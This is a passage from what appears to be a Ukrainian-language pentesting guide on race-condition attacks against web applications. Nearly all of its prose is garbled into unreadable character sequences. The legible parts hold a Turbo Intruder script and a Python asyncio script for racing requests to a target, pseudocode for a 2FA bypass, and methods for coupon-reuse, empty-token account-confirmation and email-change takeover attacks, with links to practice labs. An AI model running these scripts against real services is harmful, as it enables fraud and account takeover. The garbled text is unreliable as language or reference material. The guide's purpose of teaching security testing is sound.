–ø–∞–∫–µ—Ç–∞, –ø–æ–∫–∏ –≤—Å—ñ —Ñ—Ä–∞–≥–º–µ–Ω—Ç–∏ –Ω–µ –¥–æ—Å—è–≥–Ω—É—Ç—å —Å–µ—Ä–≤–µ—Ä–∞. –¶—è —Ç–µ—Ö–Ω—ñ–∫–∞ –¥–æ–∑–≤–æ–ª–∏–ª–∞ –¥–æ—Å–ª—ñ–¥–Ω–∏–∫—É –Ω–∞–¥—ñ—Å–ª–∞—Ç–∏ 10,000 –∑–∞–ø–∏—Ç—ñ–≤ –ø—Ä–∏–±–ª–∏–∑–Ω–æ –∑–∞ 166 –º—Å.&#x20;

–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ —Ö–æ—á–∞ —Ü–µ –ø–æ–ª—ñ–ø—à–µ–Ω–Ω—è —Ä–æ–±–∏—Ç—å –∞—Ç–∞–∫—É –±—ñ–ª—å—à –Ω–∞–¥—ñ–π–Ω–æ—é –≤ RC, —è–∫–∞ –≤–∏–º–∞–≥–∞—î, —â–æ–± —Å–æ—Ç–Ω—ñ/—Ç–∏—Å—è—á—ñ –ø–∞–∫–µ—Ç—ñ–≤ –ø—Ä–∏–±—É–ª–∏ –æ–¥–Ω–æ—á–∞—Å–Ω–æ, —Ü–µ —Ç–∞–∫–æ–∂ –º–æ–∂–µ –º–∞—Ç–∏ –¥–µ—è–∫—ñ –ø—Ä–æ–≥—Ä–∞–º–Ω—ñ –æ–±–º–µ–∂–µ–Ω–Ω—è. –î–µ—è–∫—ñ –ø–æ–ø—É–ª—è—Ä–Ω—ñ HTTP-—Å–µ—Ä–≤–µ—Ä–∏, —Ç–∞–∫—ñ —è–∫ Apache, Nginx —ñ Go, –º–∞—é—Ç—å —Å—É–≤–æ—Ä–µ –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è `SETTINGS_MAX_CONCURRENT_STREAMS` –Ω–∞ 100, 128 —ñ 250. –û–¥–Ω–∞–∫ —ñ–Ω—à—ñ, —Ç–∞–∫—ñ —è–∫ NodeJS —ñ nghttp2, –º–∞—é—Ç—å –π–æ–≥–æ –±–µ–∑ –æ–±–º–µ–∂–µ–Ω—å.\
–¶–µ –≤ –æ—Å–Ω–æ–≤–Ω–æ–º—É –æ–∑–Ω–∞—á–∞—î, —â–æ Apache –±—É–¥–µ –≤—Ä–∞—Ö–æ–≤—É–≤–∞—Ç–∏ –ª–∏—à–µ 100 HTTP-–∑'—î–¥–Ω–∞–Ω—å –∑ –æ–¥–Ω–æ–≥–æ TCP-–∑'—î–¥–Ω–∞–Ω–Ω—è (–æ–±–º–µ–∂—É—é—á–∏ —Ü—é –∞—Ç–∞–∫—É RC).

–í–∏ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ –¥–µ—è–∫—ñ –ø—Ä–∏–∫–ª–∞–¥–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è —Ü—ñ—î—ó —Ç–µ—Ö–Ω—ñ–∫–∏ –≤ —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó [https://github.com/Ry0taK/first-sequence-sync/tree/main](https://github.com/Ry0taK/first-sequence-sync/tree/main).

## –°–∏—Ä–æ–≤–∏–Ω–Ω–∏–π BF

–ü–µ—Ä–µ–¥ –ø–æ–ø–µ—Ä–µ–¥–Ω—ñ–º –¥–æ—Å–ª—ñ–¥–∂–µ–Ω–Ω—è–º –±—É–ª–∏ –¥–µ—è–∫—ñ –∫–æ—Ä–∏—Å–Ω—ñ –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è, —è–∫—ñ –ø—Ä–æ—Å—Ç–æ –Ω–∞–º–∞–≥–∞–ª–∏—Å—è –Ω–∞–¥—Å–∏–ª–∞—Ç–∏ –ø–∞–∫–µ—Ç–∏ —è–∫–æ–º–æ–≥–∞ —à–≤–∏–¥—à–µ, —â–æ–± –≤–∏–∫–ª–∏–∫–∞—Ç–∏ RC.

* **–ü–æ–≤—Ç–æ—Ä—é–≤–∞—á:** –ü–µ—Ä–µ–≥–ª—è–Ω—å—Ç–µ –ø—Ä–∏–∫–ª–∞–¥–∏ –∑ –ø–æ–ø–µ—Ä–µ–¥–Ω—å–æ–≥–æ —Ä–æ–∑–¥—ñ–ª—É.
* **–ó–ª–æ–≤–º–∏—Å–Ω–∏–∫**: –ù–∞–¥—ñ—à–ª—ñ—Ç—å **–∑–∞–ø–∏—Ç** –¥–æ **–ó–ª–æ–≤–º–∏—Å–Ω–∏–∫–∞**, –≤—Å—Ç–∞–Ω–æ–≤—ñ—Ç—å **–∫—ñ–ª—å–∫—ñ—Å—Ç—å –ø–æ—Ç–æ–∫—ñ–≤** –Ω–∞ **30** —É **–º–µ–Ω—é –ø–∞—Ä–∞–º–µ—Ç—Ä—ñ–≤** —ñ –≤–∏–±–µ—Ä—ñ—Ç—å —è–∫ –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è **Null payloads** —Ç–∞ –∑–≥–µ–Ω–µ—Ä—É–π—Ç–µ **30.**
* **Turbo Intruder**
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
pipeline=False
)
a = ['Session=<session_id_1>','Session=<session_id_2>','Session=<session_id_3>']
for i in range(len(a)):
engine.queue(target.req,a[i], gate='race1')
# open TCP connections and send partial requests
engine.start(timeout=10)
engine.openGate('race1')
engine.complete(timeout=60)

def handleResponse(req, interesting):
table.add(req)
```
* **Python - asyncio**
```python
import asyncio
import httpx

async def use_code(client):
resp = await client.post(f'http://victim.com', cookies={"session": "asdasdasd"}, data={"code": "123123123"})
return resp.text

async def main():
async with httpx.AsyncClient() as client:
tasks = []
for _ in range(20): #20 times
tasks.append(asyncio.ensure_future(use_code(client)))

# Get responses
results = await asyncio.gather(*tasks, return_exceptions=True)

# Print results
for r in results:
print(r)

# Async2sync sleep
await asyncio.sleep(0.5)
print(results)

asyncio.run(main())
```
## **RC Methodology**

### Limit-overrun / TOCTOU

–¶–µ –Ω–∞–π–æ—Å–Ω–æ–≤–Ω—ñ—à–∏–π —Ç–∏–ø –≥–æ–Ω–∫–∏, –¥–µ **–≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ** –∑'—è–≤–ª—è—é—Ç—å—Å—è –≤ –º—ñ—Å—Ü—è—Ö, —è–∫—ñ **–æ–±–º–µ–∂—É—é—Ç—å –∫—ñ–ª—å–∫—ñ—Å—Ç—å —Ä–∞–∑—ñ–≤, –∫–æ–ª–∏ –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ–Ω–∞—Ç–∏ –¥—ñ—é**. –ù–∞–ø—Ä–∏–∫–ª–∞–¥, –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –æ–¥–Ω–æ–≥–æ –π —Ç–æ–≥–æ –∂ –∫–æ–¥—É –∑–Ω–∏–∂–∫–∏ –≤ —ñ–Ω—Ç–µ—Ä–Ω–µ—Ç-–º–∞–≥–∞–∑–∏–Ω—ñ –∫—ñ–ª—å–∫–∞ —Ä–∞–∑—ñ–≤. –î—É–∂–µ –ø—Ä–æ—Å—Ç–∏–π –ø—Ä–∏–∫–ª–∞–¥ –º–æ–∂–Ω–∞ –∑–Ω–∞–π—Ç–∏ –≤ [**—Ü—å–æ–º—É –∑–≤—ñ—Ç—ñ**](https://medium.com/@pravinponnusamy/race-condition-vulnerability-found-in-bug-bounty-program-573260454c43) –∞–±–æ –≤ [**—Ü—å–æ–º—É –±–∞–≥—É**](https://hackerone.com/reports/759247)**.**

–Ü—Å–Ω—É—î –±–∞–≥–∞—Ç–æ –≤–∞—Ä—ñ–∞—Ü—ñ–π —Ü—å–æ–≥–æ —Ç–∏–ø—É –∞—Ç–∞–∫–∏, –≤–∫–ª—é—á–∞—é—á–∏:

* –í–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –ø–æ–¥–∞—Ä—É–Ω–∫–æ–≤–æ—ó –∫–∞—Ä—Ç–∫–∏ –∫—ñ–ª—å–∫–∞ —Ä–∞–∑—ñ–≤
* –û—Ü—ñ–Ω–∫–∞ –ø—Ä–æ–¥—É–∫—Ç—É –∫—ñ–ª—å–∫–∞ —Ä–∞–∑—ñ–≤
* –í–∏–≤–µ–¥–µ–Ω–Ω—è –∞–±–æ –ø–µ—Ä–µ–∫–∞–∑ –≥–æ—Ç—ñ–≤–∫–∏ –ø–æ–Ω–∞–¥ –∑–∞–ª–∏—à–æ–∫ –Ω–∞ —Ä–∞—Ö—É–Ω–∫—É
* –ü–æ–≤—Ç–æ—Ä–Ω–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –æ–¥–Ω–æ–≥–æ —Ä—ñ—à–µ–Ω–Ω—è CAPTCHA
* –û–±—Ö—ñ–¥ –æ–±–º–µ–∂–µ–Ω–Ω—è —à–≤–∏–¥–∫–æ—Å—Ç—ñ –∞–Ω—Ç–∏-–±—Ä—É—Ç—Ñ–æ—Ä—Å—É

### **Hidden substates**

–ï–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—è —Å–∫–ª–∞–¥–Ω–∏—Ö –≥–æ–Ω–æ–∫ —á–∞—Å—Ç–æ –ø–µ—Ä–µ–¥–±–∞—á–∞—î –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –∫–æ—Ä–æ—Ç–∫–∏—Ö –º–æ–∂–ª–∏–≤–æ—Å—Ç–µ–π –¥–ª—è –≤–∑–∞—î–º–æ–¥—ñ—ó –∑ –ø—Ä–∏—Ö–æ–≤–∞–Ω–∏–º–∏ –∞–±–æ **–Ω–µ–ø–µ—Ä–µ–¥–±–∞—á–µ–Ω–∏–º–∏ –ø—ñ–¥—Å—Ç–∞–Ω—Ü—ñ—è–º–∏ –º–∞—à–∏–Ω–∏**. –û—Å—å —è–∫ –ø—ñ–¥—ñ–π—Ç–∏ –¥–æ —Ü—å–æ–≥–æ:

1. **–í–∏–∑–Ω–∞—á—Ç–µ –ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω—ñ –ø—Ä–∏—Ö–æ–≤–∞–Ω—ñ –ø—ñ–¥—Å—Ç–∞–Ω—Ü—ñ—ó**
* –ü–æ—á–Ω—ñ—Ç—å –∑ –≤–∏–∑–Ω–∞—á–µ–Ω–Ω—è –∫—ñ–Ω—Ü–µ–≤–∏—Ö —Ç–æ—á–æ–∫, —è–∫—ñ –∑–º—ñ–Ω—é—é—Ç—å –∞–±–æ –≤–∑–∞—î–º–æ–¥—ñ—é—Ç—å –∑ –∫—Ä–∏—Ç–∏—á–Ω–∏–º–∏ –¥–∞–Ω–∏–º–∏, —Ç–∞–∫–∏–º–∏ —è–∫ –ø—Ä–æ—Ñ—ñ–ª—ñ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ –∞–±–æ –ø—Ä–æ—Ü–µ—Å–∏ —Å–∫–∏–¥–∞–Ω–Ω—è –ø–∞—Ä–æ–ª—ñ–≤. –ó–æ—Å–µ—Ä–µ–¥—å—Ç–µ—Å—è –Ω–∞:
* **–ó–±–µ—Ä—ñ–≥–∞–Ω–Ω—è**: –í—ñ–¥–¥–∞–≤–∞–π—Ç–µ –ø–µ—Ä–µ–≤–∞–≥—É –∫—ñ–Ω—Ü–µ–≤–∏–º —Ç–æ—á–∫–∞–º, —è–∫—ñ –º–∞–Ω—ñ–ø—É–ª—é—é—Ç—å –ø–æ—Å—Ç—ñ–π–Ω–∏–º–∏ –¥–∞–Ω–∏–º–∏ –Ω–∞ —Å—Ç–æ—Ä–æ–Ω—ñ —Å–µ—Ä–≤–µ—Ä–∞, –∞ –Ω–µ —Ç–∏–º–∏, —â–æ –æ–±—Ä–æ–±–ª—è—é—Ç—å –¥–∞–Ω—ñ –Ω–∞ —Å—Ç–æ—Ä–æ–Ω—ñ –∫–ª—ñ—î–Ω—Ç–∞.
* **–î—ñ—è**: –®—É–∫–∞–π—Ç–µ –æ–ø–µ—Ä–∞—Ü—ñ—ó, —è–∫—ñ –∑–º—ñ–Ω—é—é—Ç—å —ñ—Å–Ω—É—é—á—ñ –¥–∞–Ω—ñ, –æ—Å–∫—ñ–ª—å–∫–∏ –≤–æ–Ω–∏ –±—ñ–ª—å—à —ñ–º–æ–≤—ñ—Ä–Ω–æ —Å—Ç–≤–æ—Ä—é—é—Ç—å –µ–∫—Å–ø–ª—É–∞—Ç–æ–≤–∞–Ω—ñ —É–º–æ–≤–∏ –≤ –ø–æ—Ä—ñ–≤–Ω—è–Ω–Ω—ñ –∑ —Ç–∏–º–∏, —â–æ –¥–æ–¥–∞—é—Ç—å –Ω–æ–≤—ñ –¥–∞–Ω—ñ.
* **–ö–ª—é—á—É–≤–∞–Ω–Ω—è**: –£—Å–ø—ñ—à–Ω—ñ –∞—Ç–∞–∫–∏ –∑–∞–∑–≤–∏—á–∞–π –≤–∫–ª—é—á–∞—é—Ç—å –æ–ø–µ—Ä–∞—Ü—ñ—ó, —è–∫—ñ –∫–ª—é—á—É—é—Ç—å—Å—è –Ω–∞ –æ–¥–Ω–æ–º—É –π —Ç–æ–º—É –∂ —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ç–æ—Ä—ñ, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥, —ñ–º'—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –∞–±–æ —Ç–æ–∫–µ–Ω —Å–∫–∏–¥–∞–Ω–Ω—è.
2. **–ü—Ä–æ–≤–µ–¥—ñ—Ç—å –ø–æ—á–∞—Ç–∫–æ–≤–µ —Ç–µ—Å—Ç—É–≤–∞–Ω–Ω—è**
* –¢–µ—Å—Ç—É–π—Ç–µ –≤–∏–∑–Ω–∞—á–µ–Ω—ñ –∫—ñ–Ω—Ü–µ–≤—ñ —Ç–æ—á–∫–∏ –∑ –∞—Ç–∞–∫–∞–º–∏ –≥–æ–Ω–∫–∏, —Å–ø–æ—Å—Ç–µ—Ä—ñ–≥–∞—é—á–∏ –∑–∞ –±—É–¥—å-—è–∫–∏–º–∏ –≤—ñ–¥—Ö–∏–ª–µ–Ω–Ω—è–º–∏ –≤—ñ–¥ –æ—á—ñ–∫—É–≤–∞–Ω–∏—Ö —Ä–µ–∑—É–ª—å—Ç–∞—Ç—ñ–≤. –ù–µ—Å–ø–æ–¥—ñ–≤–∞–Ω—ñ –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ –∞–±–æ –∑–º—ñ–Ω–∏ –≤ –ø–æ–≤–µ–¥—ñ–Ω—Ü—ñ –ø—Ä–æ–≥—Ä–∞–º–∏ –º–æ–∂—É—Ç—å —Å–∏–≥–Ω–∞–ª—ñ–∑—É–≤–∞—Ç–∏ –ø—Ä–æ –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å.
3. **–î–µ–º–æ–Ω—Å—Ç—Ä—É–π—Ç–µ –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å**
* –ó–≤—É–∑—å—Ç–µ –∞—Ç–∞–∫—É –¥–æ –º—ñ–Ω—ñ–º–∞–ª—å–Ω–æ—ó –∫—ñ–ª—å–∫–æ—Å—Ç—ñ –∑–∞–ø–∏—Ç—ñ–≤, –Ω–µ–æ–±—Ö—ñ–¥–Ω–∏—Ö –¥–ª—è –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ, —á–∞—Å—Ç–æ –≤—Å—å–æ–≥–æ –¥–æ –¥–≤–æ—Ö. –¶–µ–π –µ—Ç–∞–ø –º–æ–∂–µ –≤–∏–º–∞–≥–∞—Ç–∏ –∫—ñ–ª—å–∫–æ—Ö —Å–ø—Ä–æ–± –∞–±–æ –∞–≤—Ç–æ–º–∞—Ç–∏–∑–∞—Ü—ñ—ó —á–µ—Ä–µ–∑ —Ç–æ—á–Ω–∏–π —Ç–∞–π–º—ñ–Ω–≥.

### Time Sensitive Attacks

–¢–æ—á–Ω—ñ—Å—Ç—å —É —Ç–∞–π–º—ñ–Ω–≥—É –∑–∞–ø–∏—Ç—ñ–≤ –º–æ–∂–µ –≤–∏—è–≤–∏—Ç–∏ –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ, –æ—Å–æ–±–ª–∏–≤–æ –∫–æ–ª–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å—Å—è –ø–µ—Ä–µ–¥–±–∞—á—É–≤–∞–Ω—ñ –º–µ—Ç–æ–¥–∏, —Ç–∞–∫—ñ —è–∫ –º—ñ—Ç–∫–∏ —á–∞—Å—É, –¥–ª—è –±–µ–∑–ø–µ–∫–æ–≤–∏—Ö —Ç–æ–∫–µ–Ω—ñ–≤. –ù–∞–ø—Ä–∏–∫–ª–∞–¥, –≥–µ–Ω–µ—Ä–∞—Ü—ñ—è —Ç–æ–∫–µ–Ω—ñ–≤ —Å–∫–∏–¥–∞–Ω–Ω—è –ø–∞—Ä–æ–ª—ñ–≤ –Ω–∞ –æ—Å–Ω–æ–≤—ñ –º—ñ—Ç–æ–∫ —á–∞—Å—É –º–æ–∂–µ –¥–æ–∑–≤–æ–ª–∏—Ç–∏ —ñ–¥–µ–Ω—Ç–∏—á–Ω—ñ —Ç–æ–∫–µ–Ω–∏ –¥–ª—è –æ–¥–Ω–æ—á–∞—Å–Ω–∏—Ö –∑–∞–ø–∏—Ç—ñ–≤.

**–î–ª—è –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó:**

* –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ —Ç–æ—á–Ω–∏–π —Ç–∞–π–º—ñ–Ω–≥, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥, –∞—Ç–∞–∫—É –∑ –æ–¥–Ω–æ–≥–æ –ø–∞–∫–µ—Ç–∞, —â–æ–± –∑—Ä–æ–±–∏—Ç–∏ –æ–¥–Ω–æ—á–∞—Å–Ω—ñ –∑–∞–ø–∏—Ç–∏ –Ω–∞ —Å–∫–∏–¥–∞–Ω–Ω—è –ø–∞—Ä–æ–ª—è. –Ü–¥–µ–Ω—Ç–∏—á–Ω—ñ —Ç–æ–∫–µ–Ω–∏ –≤–∫–∞–∑—É—é—Ç—å –Ω–∞ –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å.

**–ü—Ä–∏–∫–ª–∞–¥:**

* –ó–∞–ø—Ä–æ—Å—ñ—Ç—å –¥–≤–∞ —Ç–æ–∫–µ–Ω–∏ —Å–∫–∏–¥–∞–Ω–Ω—è –ø–∞—Ä–æ–ª—è –æ–¥–Ω–æ—á–∞—Å–Ω–æ —Ç–∞ –ø–æ—Ä—ñ–≤–Ω—è–π—Ç–µ —ó—Ö. –°–ø—ñ–≤–ø–∞–¥—ñ–Ω–Ω—è —Ç–æ–∫–µ–Ω—ñ–≤ –≤–∫–∞–∑—É—î –Ω–∞ –Ω–µ–¥–æ–ª—ñ–∫ —É –≥–µ–Ω–µ—Ä–∞—Ü—ñ—ó —Ç–æ–∫–µ–Ω—ñ–≤.

**–ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ —Ü–µ** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-exploiting-time-sensitive-vulnerabilities) **—â–æ–± —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ —Ü–µ.**

## Hidden substates case studies

### Pay & add an Item

–ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ —Ü–µ [**PortSwigger Lab**](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-insufficient-workflow-validation), —â–æ–± –¥—ñ–∑–Ω–∞—Ç–∏—Å—è, —è–∫ **–ø–ª–∞—Ç–∏—Ç–∏** –≤ –º–∞–≥–∞–∑–∏–Ω—ñ —Ç–∞ **–¥–æ–¥–∞—Ç–∏ –¥–æ–¥–∞—Ç–∫–æ–≤–∏–π** —Ç–æ–≤–∞—Ä, –∑–∞ —è–∫–∏–π **–Ω–µ –ø–æ—Ç—Ä—ñ–±–Ω–æ –ø–ª–∞—Ç–∏—Ç–∏**.

### Confirm other emails

–Ü–¥–µ—è –ø–æ–ª—è–≥–∞—î –≤ —Ç–æ–º—É, —â–æ–± **–ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏ –µ–ª–µ–∫—Ç—Ä–æ–Ω–Ω—É –∞–¥—Ä–µ—Å—É —Ç–∞ –∑–º—ñ–Ω–∏—Ç–∏ —ó—ó –Ω–∞ —ñ–Ω—à—É –æ–¥–Ω–æ—á–∞—Å–Ω–æ**, —â–æ–± –¥—ñ–∑–Ω–∞—Ç–∏—Å—è, —á–∏ –ø–ª–∞—Ç—Ñ–æ—Ä–º–∞ –ø–µ—Ä–µ–≤—ñ—Ä—è—î –Ω–æ–≤—É –∑–º—ñ–Ω–µ–Ω—É.

### Change email to 2 emails addresses Cookie based

–ó–≥—ñ–¥–Ω–æ –∑ [**—Ü–∏–º –¥–æ—Å–ª—ñ–¥–∂–µ–Ω–Ω—è–º**](https://portswigger.net/research/smashing-the-state-machine), Gitlab –±—É–≤ –≤—Ä–∞–∑–ª–∏–≤–∏–π –¥–æ –∑–∞—Ö–æ–ø–ª–µ–Ω–Ω—è —Ç–∞–∫–∏–º —á–∏–Ω–æ–º, –æ—Å–∫—ñ–ª—å–∫–∏ –≤—ñ–Ω –º—ñ–≥ **–Ω–∞–¥—ñ—Å–ª–∞—Ç–∏** **—Ç–æ–∫–µ–Ω –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ –µ–ª–µ–∫—Ç—Ä–æ–Ω–Ω–æ—ó –ø–æ—à—Ç–∏ –æ–¥–Ω—ñ—î—ó –µ–ª–µ–∫—Ç—Ä–æ–Ω–Ω–æ—ó –∞–¥—Ä–µ—Å–∏ –Ω–∞ —ñ–Ω—à—É –µ–ª–µ–∫—Ç—Ä–æ–Ω–Ω—É –∞–¥—Ä–µ—Å—É**.

**–ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ —Ü–µ** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-single-endpoint) **—â–æ–± —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ —Ü–µ.**

### Hidden Database states / Confirmation Bypass

–Ø–∫—â–æ **–≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å—Å—è 2 —Ä—ñ–∑–Ω—ñ –∑–∞–ø–∏—Å–∏** –¥–ª—è **–¥–æ–¥–∞–≤–∞–Ω–Ω—è** **—ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó** –≤ **–±–∞–∑—É –¥–∞–Ω–∏—Ö**, —ñ—Å–Ω—É—î –Ω–µ–≤–µ–ª–∏–∫–∏–π –ø—Ä–æ–º—ñ–∂–æ–∫ —á–∞—Å—É, –∫–æ–ª–∏ **–ª–∏—à–µ –ø–µ—Ä—à—ñ –¥–∞–Ω—ñ –±—É–ª–∏ –∑–∞–ø–∏—Å–∞–Ω—ñ** –≤ –±–∞–∑—É –¥–∞–Ω–∏—Ö. –ù–∞–ø—Ä–∏–∫–ª–∞–¥, –ø—Ä–∏ —Å—Ç–≤–æ—Ä–µ–Ω–Ω—ñ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ **—ñ–º'—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞** —Ç–∞ **–ø–∞—Ä–æ–ª—å** –º–æ–∂—É—Ç—å –±—É—Ç–∏ **–∑–∞–ø–∏—Å–∞–Ω—ñ**, –∞ **–ø–æ—Ç—ñ–º –∑–∞–ø–∏—Å—É—î—Ç—å—Å—è —Ç–æ–∫–µ–Ω** –¥–ª—è –ø—ñ–¥—Ç–≤–µ—Ä–¥–∂–µ–Ω–Ω—è –Ω–æ–≤–æ—Å—Ç–≤–æ—Ä–µ–Ω–æ–≥–æ –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É. –¶–µ –æ–∑–Ω–∞—á–∞—î, —â–æ –ø—Ä–æ—Ç—è–≥–æ–º –∫–æ—Ä–æ—Ç–∫–æ–≥–æ —á–∞—Å—É **—Ç–æ–∫–µ–Ω –¥–ª—è –ø—ñ–¥—Ç–≤–µ—Ä–¥–∂–µ–Ω–Ω—è –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É —î –Ω—É–ª—å–æ–≤–∏–º**.

–û—Ç–∂–µ, **—Ä–µ—î—Å—Ç—Ä–∞—Ü—ñ—è –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É —Ç–∞ –Ω–∞–¥—Å–∏–ª–∞–Ω–Ω—è –∫—ñ–ª—å–∫–æ—Ö –∑–∞–ø–∏—Ç—ñ–≤ –∑ –ø–æ—Ä–æ–∂–Ω—ñ–º —Ç–æ–∫–µ–Ω–æ–º** (`token=` –∞–±–æ `token[]=` –∞–±–æ –±—É–¥—å-—è–∫–∞ —ñ–Ω—à–∞ –≤–∞—Ä—ñ–∞—Ü—ñ—è) –¥–ª—è –Ω–µ–≥–∞–π–Ω–æ–≥–æ –ø—ñ–¥—Ç–≤–µ—Ä–¥–∂–µ–Ω–Ω—è –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É –º–æ–∂–µ –¥–æ–∑–≤–æ–ª–∏—Ç–∏ **–ø—ñ–¥—Ç–≤–µ—Ä–¥–∏—Ç–∏ –æ–±–ª—ñ–∫–æ–≤–∏–π –∑–∞–ø–∏—Å**, –¥–µ –≤–∏ –Ω–µ –∫–æ–Ω—Ç—Ä–æ–ª—é—î—Ç–µ –µ–ª–µ–∫—Ç—Ä–æ–Ω–Ω—É –ø–æ—à—Ç—É.

**–ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ —Ü–µ** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-partial-construction) **—â–æ–± —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ —Ü–µ.**

### Bypass 2FA

–ù–∞—Å—Ç—É–ø–Ω–∏–π –ø—Å–µ–≤–¥–æ–∫–æ–¥ –≤—Ä–∞–∑–ª–∏–≤–∏–π –¥–æ –≥–æ–Ω–∫–∏, –æ—Å–∫—ñ–ª—å–∫–∏ –ø—Ä–æ—Ç—è–≥–æ–º –¥—É–∂–µ –∫–æ—Ä–æ—Ç–∫–æ–≥–æ —á–∞—Å—É **2FA –Ω–µ –∑–∞—Å—Ç–æ—Å–æ–≤—É—î—Ç—å—Å—è**, –ø–æ–∫–∏ —Å—Ç–≤–æ—Ä—é—î—Ç—å—Å—è —Å–µ—Å—ñ—è:
```python
session['userid'] = user.userid
if user.mfa_enabled:
session['enforce_mfa'] = True
# generate and send MFA code to user
# redirect browser to MFA code entry form
```
### OAuth2 –≤—ñ—á–Ω–∞ –ø–æ—Å—Ç—ñ–π–Ω—ñ—Å—Ç—å

–Ñ –∫—ñ–ª—å–∫–∞ [**–ø–æ—Å—Ç–∞—á–∞–ª—å–Ω–∏–∫—ñ–≤ OAUth**](https://en.wikipedia.org/wiki/List\_of\_OAuth\_providers). –¶—ñ —Å–µ—Ä–≤—ñ—Å–∏ –¥–æ–∑–≤–æ–ª—è—Ç—å –≤–∞–º —Å—Ç–≤–æ—Ä–∏—Ç–∏ –¥–æ–¥–∞—Ç–æ–∫ —ñ –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫—É–≤–∞—Ç–∏ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤, —è–∫–∏—Ö –∑–∞—Ä–µ—î—Å—Ç—Ä—É–≤–∞–≤ –ø–æ—Å—Ç–∞—á–∞–ª—å–Ω–∏–∫. –î–ª—è —Ü—å–æ–≥–æ **–∫–ª—ñ—î–Ω—Ç** –ø–æ–≤–∏–Ω–µ–Ω **–¥–æ–∑–≤–æ–ª–∏—Ç–∏ –≤–∞—à–æ–º—É –¥–æ–¥–∞—Ç–∫—É** –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ –¥–µ—è–∫–∏—Ö —ó—Ö–Ω—ñ—Ö –¥–∞–Ω–∏—Ö —É **–ø–æ—Å—Ç–∞—á–∞–ª—å–Ω–∏–∫–∞ OAUth**.\
–û—Ç–∂–µ, –¥–æ —Ü—å–æ–≥–æ –º–æ–º–µ–Ω—Ç—É —Ü–µ –ø—Ä–æ—Å—Ç–æ –∑–≤–∏—á–∞–π–Ω–∏–π –≤—Ö—ñ–¥ —á–µ—Ä–µ–∑ google/linkedin/github..., –¥–µ –≤–∞–º –ø—Ä–æ–ø–æ–Ω—É—é—Ç—å —Å—Ç–æ—Ä—ñ–Ω–∫—É –∑ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è–º: "_–î–æ–¥–∞—Ç–æ–∫ \<InsertCoolName> —Ö–æ—á–µ –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ –≤–∞—à–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó, —á–∏ —Ö–æ—á–µ—Ç–µ –≤–∏ —Ü–µ –¥–æ–∑–≤–æ–ª–∏—Ç–∏?_"

#### –£–º–æ–≤–∞ –≥–æ–Ω–∫–∏ –≤ `authorization_code`

